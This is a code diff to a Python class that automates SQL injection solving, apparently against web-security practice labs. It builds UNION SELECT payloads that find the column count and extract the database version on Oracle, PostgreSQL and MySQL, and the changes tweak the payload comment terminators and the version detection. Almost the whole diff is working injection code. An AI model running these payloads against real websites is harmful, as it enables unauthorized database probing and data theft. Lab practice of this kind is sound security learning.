@@ -83,7 +83,7 @@ class SQLInjectionBaseSolver(ABC):
         self.set_category()
         for dbms in self.json_payload:
             for query in dbms['list_command']:
-                url_brute = self.url + self.categories_url[1] + query + "--"
+                url_brute = self.url + self.categories_url[1] + query + "-- -"
                 self._request_lab('GET', url_brute)
                 if self.html_content.status_code == 200:
                     self.dbms = dbms['name']
@@ -94,19 +94,19 @@ class SQLInjectionBaseSolver(ABC):
 
     def determine_column_number(self):
         """Determine the number of columns."""
-        #self.spinner.start()
-        #self.spinner.text = 'Determine the number of columns'
+        self.spinner.start()
+        self.spinner.text = 'Determine the number of columns'
         # Try to find the number of columns using the UNION SELECT
         for i in range(1, 100):
             null = 'NULL,' * i
-            payload = f"' UNION SELECT {null[:-1]}--"
+            payload = f"' UNION SELECT {null[:-1]}-- -"
             if self.dbms == 'ORACLE':
-                payload = f"' UNION SELECT {null[:-1]} FROM DUAL--"
+                payload = f"' UNION SELECT {null[:-1]} FROM DUAL-- -"
             url_brute = self.url + self.categories_url[1] + payload
             self._request_lab('GET', url_brute)
             if self.html_content.status_code == 200:
                 self.total_columns = i
-                #self.spinner.stop()
+                self.spinner.stop()
                 self.console.log(f"[bold blue]Total Columns:[/bold blue] {self.total_columns}")
                 return
 
@@ -118,14 +118,14 @@ class SQLInjectionBaseSolver(ABC):
         if self.dbms == 'ORACLE':
             payload = f"' UNION SELECT {null}banner FROM v$version--"
         elif self.dbms == 'POSTGRESQL':
-            payload = f"' UNION SELECT {null}version()--"
+            payload = f"' UNION SELECT {null}version()-- -"
         else:
-            payload = f"' UNION SELECT {null}@@version--"
+            payload = f"' UNION SELECT {null}@@version-- -"
         url_brute = self.url + self.categories_url[1] + payload
         self._request_lab('GET', url_brute)
         td_html = self.soup_html.find_all('td')
         for td in td_html:
-            if 'Oracle' in td.text:
+            if 'Oracle' in td.text or 'ubuntu' in td.text:
                 self.spinner.stop()
                 self.console.log(f"[bold blue]DB Version:[/bold blue] {td.text}")
                 return
